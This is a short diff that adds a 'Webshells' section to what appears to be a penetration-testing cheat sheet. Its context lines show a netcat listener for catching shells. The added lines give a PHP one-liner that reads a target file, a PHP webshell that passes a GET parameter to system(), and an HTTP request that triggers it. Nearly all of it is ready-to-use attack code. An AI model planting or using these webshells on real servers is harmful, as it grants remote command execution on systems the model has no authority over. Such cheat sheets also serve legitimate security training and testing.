@@ -243,6 +243,23 @@ For comfort
 ```bash
 rlwrap nc -lvp $PORT
 ```
+# Webshells
+
+## PHP
+
+```php
+<?php echo file_get_contents('/path/to/target/file'); ?>
+```
+More flexible webshell
+```php
+<?php echo system($_GET['command']); ?>
+```
+Trigger
+
+```HTTP
+GET /example/exploit.php?command=id HTTP/1.1
+```
+
 
 # Common ports 
 
